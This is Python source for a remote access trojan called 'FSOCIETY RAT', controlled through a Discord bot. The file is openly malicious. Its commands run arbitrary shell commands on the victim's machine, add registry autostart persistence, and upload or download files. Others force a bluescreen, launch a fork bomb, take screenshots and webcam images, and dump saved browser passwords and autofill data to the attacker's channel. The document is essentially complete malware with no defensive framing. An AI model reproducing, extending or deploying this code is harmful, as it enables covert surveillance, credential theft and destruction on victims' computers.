import discord
from discord.ext import commands
import platform
import sys
import asyncio
import os
import io
import json
import webbrowser
import ctypes
import threading
import time
import requests
import pyttsx3
import psutil
import socket
import subprocess
from Access.screenshot import *
from Access.webcam import *
from credential.autofill import *
from credential.password import *

if sys.platform.startswith('win') and sys.version_info >= (3, 8):
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

##################################################################################
token = "yourtoken"
id = 12345
##################################################################################

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

@bot.event
async def on_ready():
    print(r"""
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XX                                                                          XX
XX   MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMMMMMMssssssssssssssssssssssssssMMMMMMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMss'''                          '''ssMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMyy''                                    ''yyMMMMMMMMMMMM   XX
XX   MMMMMMMMyy''                                            ''yyMMMMMMMM   XX
XX   MMMMMy''                                                    ''yMMMMM   XX
XX   MMMy'                                                          'yMMM   XX
XX   Mh'                                                              'hM   XX
XX   -                                                                  -   XX
XX                                                                          XX
XX   ::                                                                ::   XX
XX   MMhh.        ..hhhhhh..                      ..hhhhhh..        .hhMM   XX
XX   MMMMMh   ..hhMMMMMMMMMMhh.                .hhMMMMMMMMMMhh..   hMMMMM   XX
XX   ---MMM .hMMMMdd:::dMMMMMMMhh..        ..hhMMMMMMMd:::ddMMMMh. MMM---   XX
XX   MMMMMM MMmm''      'mmMMMMMMMMyy.  .yyMMMMMMMMmm'      ''mmMM MMMMMM   XX
XX   ---mMM ''             'mmMMMMMMMM  MMMMMMMMmm'             '' MMm---   XX
XX   yyyym'    .              'mMMMMm'  'mMMMMm'              .    'myyyy   XX
XX   mm''    .y'     ..yyyyy..  ''''      ''''  ..yyyyy..     'y.    ''mm   XX
XX           MN    .sMMMMMMMMMss.   .    .   .ssMMMMMMMMMs.    NM           XX
XX           N`    MMMMMMMMMMMMMN   M    M   NMMMMMMMMMMMMM    `N           XX
XX            +  .sMNNNNNMMMMMN+   `N    N`   +NMMMMMNNNNNMs.  +            XX
XX              o+++     ++++Mo    M      M    oM++++     +++o              XX
XX                                oo      oo                                XX
XX           oM                 oo          oo                 Mo           XX
XX         oMMo                M              M                oMMo         XX
XX       +MMMM                 s              s                 MMMM+       XX
XX      +MMMMM+            +++NNNN+        +NNNN+++            +MMMMM+      XX
XX     +MMMMMMM+       ++NNMMMMMMMMN+    +NMMMMMMMMNN++       +MMMMMMM+     XX
XX     MMMMMMMMMNN+++NNMMMMMMMMMMMMMMNNNNMMMMMMMMMMMMMMNN+++NNMMMMMMMMM     XX
XX     yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy     XX
XX   m  yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy  m   XX
XX   MMm yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy mMM   XX
XX   MMMm .yyMMMMMMMMMMMMMMMM     MMMMMMMMMM     MMMMMMMMMMMMMMMMyy. mMMM   XX
XX   MMMMd   ''''hhhhh       odddo          obbbo        hhhh''''   dMMMM   XX
XX   MMMMMd             'hMMMMMMMMMMddddddMMMMMMMMMMh'             dMMMMM   XX
XX   MMMMMMd              'hMMMMMMMMMMMMMMMMMMMMMMh'              dMMMMMM   XX
XX   MMMMMMM-               ''ddMMMMMMMMMMMMMMdd''               -MMMMMMM   XX
XX   MMMMMMMM                   '::dddddddd::'                   MMMMMMMM   XX
XX   MMMMMMMM-                                                  -MMMMMMMM   XX
XX   MMMMMMMMM                                                  MMMMMMMMM   XX
XX   MMMMMMMMMy                                                yMMMMMMMMM   XX
XX   MMMMMMMMMMy.                                            .yMMMMMMMMMM   XX
XX   MMMMMMMMMMMMy.                                        .yMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMy.                                    .yMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMs.                                .sMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMMMss.           ....           .ssMMMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMMMMMNo         oNNNNo         oNMMMMMMMMMMMMMMMMMMMM   XX
XX                                                                          XX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
          """)
    uname = platform.uname()
    user = os.getlogin()
    pc = uname.node.lower()

    guild = bot.get_guild(id)

    category = discord.utils.get(guild.categories, name=f'FSOCIETY RAT | {pc}')
    if not category:
        category = await guild.create_category(f'FSOCIETY RAT | {pc}')

    session = discord.utils.get(category.channels, name='terminal')
    if not session:
        session = await guild.create_text_channel('terminal', category=category)

        embed = discord.Embed(title="", description=f"# FSOCIETY RAT", color=0x010101)
        embed.add_field(name=f"root@{user}:~#", value=pc, inline=False)
        embed.set_image(url="https://images-ext-1.discordapp.net/external/qQQj0lHwHpagTONe7CKJss7dSIGTBbP3Dd8Rbrx2O4Q/%3Fv%3D1734164728/https/cdn.shopify.com/s/files/1/0693/3345/0968/files/57b1b9b7584b4c5a921c9187f5ba8ec3.jpg?format=webp")
        embed.set_footer(text="FSOCIETY RAT V1")

        await session.send(content='@everyone', embed=embed)
    else: 
        embed = discord.Embed(title="", description=f"# RECONNECTION", color=0x010101)
        embed.add_field(name=f"root@{user}:~#", value=pc, inline=False)
        embed.set_image(url="https://images-ext-1.discordapp.net/external/qQQj0lHwHpagTONe7CKJss7dSIGTBbP3Dd8Rbrx2O4Q/%3Fv%3D1734164728/https/cdn.shopify.com/s/files/1/0693/3345/0968/files/57b1b9b7584b4c5a921c9187f5ba8ec3.jpg?format=webp")
        embed.set_footer(text="FSOCIETY RAT V1")

        await session.send(content='@everyone', embed=embed)

@bot.command()
async def help(ctx):
    helps = """
FSOCIETY RAT commands line:

System Access:

!startup               : Add autostart
!execute <commands>    : Run shell command
!cd <directory>        : Change directory
!sysinfo               : Get system info
!open <link>           : Open a web browser
!bsod                  : Trigger bluescreen
!shutdown              : Shutdown the system
!restart               : Restart the system
!msgbox <title> <text> : Show message box
!textspech <text>      : text to speech
!wallpaper             : Set wallpaper attach image
!ip                    : Get public IP info
!download <path>       : Download file from target
!upload                : Upload file to target
!process               : List running processes
!processkill <pid>     : Kill a process by PID
!forkbomb              : Rabbit Virus

Device Access:

!screenshot            : Take a screenshot
!webcam                : Capture webcam image

Credential Dump:

!password              : Dump saved passwords
!autofill              : Dump saved autofill data
    """
    await ctx.send(f"```{helps}```")

@bot.command()
async def execute(ctx, *, cmd):
    shell = subprocess.getoutput(cmd)
    if len(shell) > 1900:
        await ctx.send(file=discord.File(io.StringIO(shell), filename="fsociety.txt"))
    else:
        await ctx.send(f"{shell}")

@bot.command()
async def cd(ctx, *, path=None):
    try: 
        if path:
            os.chdir(path)
        await ctx.send(os.getcwd())
    except:
        pass
    
@bot.command()
async def sysinfo(ctx):
    try:
        ip = socket.gethostbyname(socket.gethostname())
        uname = platform.uname()
        ram = round(psutil.virtual_memory().total / (1024**3))
        await ctx.send (
            f"OS : {uname.system}\n"
            f"Version : {uname.version}\n"
            f"Arch : {platform.architecture()[0]}\n"
            f"CPU : {uname.processor}\n"
            f"Hostname : {uname.node}\n"
            f"IP : {ip}\n"
            f"Cores : {os.cpu_count()}\n"
            f"RAM : {ram} GB\n"
            f"User : {os.getlogin()}"
        )
    except:
        pass

@bot.command()
async def open(ctx, url):
    webbrowser.open(url)
    await ctx.send("success")

@bot.command()
async def bsod(ctx):
    await ctx.send("success")
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))

@bot.command()
async def startup(ctx):
    os.system(f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Letriume" /t REG_SZ /d "{sys.executable}" /f')
    await ctx.send("success")

@bot.command()
async def download(ctx, path):
    if os.path.exists(path):
        await ctx.send(file=discord.File(path))
    else:
        await ctx.send("::skull::")

@bot.command()
async def upload(ctx):
    if ctx.message.attachments:
        await ctx.message.attachments[0].save(ctx.message.attachments[0].filename)
        await ctx.send("success")

@bot.command()
async def wallpaper(ctx):
    wall = ctx.message.attachments[0]
    path = os.path.join(os.getenv("TEMP"), wall.filename)
    await wall.save(path)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
    await ctx.send("success")

@bot.command()
async def ip(ctx):
    r = requests.get("https://ipinfo.io/json").json()
    await ctx.send(f"{json.dumps(r)}")

@bot.command()
async def forkbomb(ctx):
    while True:
        os.system('start cmd')
        time.sleep(0.01)
        await ctx.send("success")
    
@bot.command()
async def process(ctx):
    processes = []
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            processes.append(f"PID: {proc.info['pid']} - Name: {proc.info['name']}")
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass

    process = "\n".join(processes)

    if len(process) > 1900:
        await ctx.send(file=discord.File(io.BytesIO(process.encode()), filename="fsociety.txt"))
    else:
        await ctx.send(f"{process}")

@bot.command()
async def processkill(ctx, pid):
    try:
        proc = psutil.Process(int(pid))
        proc.kill()
        await ctx.send("success")
    except (psutil.NoSuchProcess, psutil.AccessDenied, ValueError):
        pass

@bot.command()
async def shutdown(ctx):
    os.system("shutdown /s /t 0")
    await ctx.send("success")

@bot.command()
async def restart(ctx):
    os.system("shutdown /r /t 0")
    await ctx.send("success")

@bot.command()
async def msgbox(ctx, title: str, text, style: int = 0):
    def BoxW():
        ctypes.windll.user32.MessageBoxW(0, text, title, style)
    threading.Thread(target=BoxW).start()
    await ctx.send("success")

@bot.command()
async def textspech(ctx, *, text: str):
    tts = pyttsx3.init()
    tts.say(text)
    tts.runAndWait()

    await ctx.send("success")

@bot.command()
async def screenshot(ctx):
    await ctx.send(file=discord.File(fp=screenshots(), filename="screenshot.png"))
    os.remove("screenshot.png")

@bot.command()
async def webcam(ctx):
    await ctx.send(file=discord.File(fp=webcams(), filename="webcam.png"))
    os.remove("webcam.png")

@bot.command()
async def password(ctx):
    await ctx.send(file=discord.File(io.StringIO(json.dumps(ext(), indent=2)), filename="password.json"))

    
    
@bot.command()
async def autofill(ctx):
    await ctx.send(file=discord.File(io.StringIO(json.dumps(autofills(), indent=2)), filename="password.json"))


    

bot.run(token)
